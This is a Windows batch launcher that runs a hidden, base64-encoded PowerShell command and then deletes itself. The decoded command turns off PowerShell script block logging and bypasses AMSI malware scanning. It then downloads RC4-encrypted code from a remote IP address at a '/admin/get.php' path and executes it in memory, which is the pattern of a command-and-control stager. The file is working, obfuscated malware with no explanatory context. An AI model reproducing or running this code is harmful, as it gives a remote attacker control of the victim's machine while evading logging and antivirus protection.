@echo off
start /b powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAUwBpAE8ATgBUAGEAQgBsAGUALgBQAFMAVgBlAHIAUwBJAE8ATgAuAE0AQQBqAG8AUgAgAC0ARwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBlAEYAXQAuAEEAcwBTAGUAbQBiAGwAeQAuAEcARQBUAFQAWQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAVABWAEEATAB1AEUAKAAkAE4AdQBsAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBMAD0AWwBDAG8AbABMAGUAQwB0AGkAbwBuAFMALgBHAEUAbgBlAHIASQBDAC4ARABJAEMAVABJAE8ATgBBAHIAeQBbAFMAVABSAEkATgBHACwAUwB5AHMAdABlAE0ALgBPAEIASgBFAEMAVABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBBAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUATABTAGUAewBbAFMAYwByAGkAUAB0AEIAbABvAGMASwBdAC4AIgBHAEUAVABGAGkAZQBgAEwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAKABOAGUAVwAtAE8AQgBKAGUAQwBUACAAQwBPAEwATABlAEMAdABJAG8AbgBzAC4ARwBlAG4ARQByAGkAQwAuAEgAYQBzAEgAUwBFAHQAWwBTAHQAUgBJAG4ARwBdACkAKQB9AFsAUgBlAEYAXQAuAEEAcwBzAEUATQBCAEwAWQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBlAFQARgBJAEUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAGEAbAB1AGUAKAAkAE4AVQBMAGwALAAkAFQAcgBVAEUAKQB9ADsAfQA7AFsAUwB5AHMAdABFAG0ALgBOAEUAVAAuAFMARQByAHYASQBDAEUAUABvAEkAbgB0AE0AQQBuAEEAZwBlAFIAXQA6ADoARQBYAHAARQBjAFQAMQAwADAAQwBvAG4AVABpAG4AdQBlAD0AMAA7ACQAdwBDAD0ATgBlAFcALQBPAEIAagBlAEMAdAAgAFMAWQBzAHQAZQBtAC4ATgBlAHQALgBXAEUAQgBDAEwAaQBFAG4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAQwAuAEgARQBhAEQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAcgBvAFgAeQA9AFsAUwBZAHMAdABlAE0ALgBOAEUAVAAuAFcARQBiAFIAZQBRAHUAZQBzAHQAXQA6ADoARABlAGYAQQBVAGwAVABXAEUAYgBQAHIATwB4AHkAOwAkAFcAQwAuAFAAcgBvAFgAWQAuAEMAcgBlAGQAZQBuAFQASQBhAGwAUwAgAD0AIABbAFMAeQBzAHQARQBtAC4ATgBFAHQALgBDAHIARQBEAGUAbgB0AEkAQQBMAEMAQQBjAEgARQBdADoAOgBEAGUAZgBBAHUAbAB0AE4ARQBUAHcATwBSAGsAQwByAEUARABlAE4AdABJAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAHMAdABlAE0ALgBUAGUAeABUAC4ARQBuAGMATwBkAEkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcASgBtAEYAUwBJAHoAOgBkAFgAPQBpADIAfABOACwARABQAH4AYwB4ACMAdwA2ADsASABSADAAXwA5ACEAOAApACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAHUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA3ADYALgAxADkANAAuADIAMgA5AC4AMQA0ADUAOgAzADcANAA0ACcAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAGMALgBIAEUAYQBkAGUAUgBzAC4AQQBkAGQAKAAiAEMAbwBvAGsAaQBlACIALAAiAHMAZQBzAHMAaQBvAG4APQBIAEYAeABzADYAUgA3AHEATwBjAFoATABGAHoAQQBCADEAZgAwAFgAVAB5ACsAaABNAHkAbwA9ACIAKQA7ACQAZABhAFQAYQA9ACQAVwBDAC4ARABvAFcATgBsAG8AQQBEAEQAYQBUAGEAKAAkAFMARQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQAZABBAFQAQQA9ACQARABBAFQAYQBbADQALgAuACQARABBAFQAQQAuAEwARQBuAGcAdABoAF0AOwAtAGoAbwBJAE4AWwBDAEgAQQByAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
start /b "" cmd /c del "%~f0"&exit /b
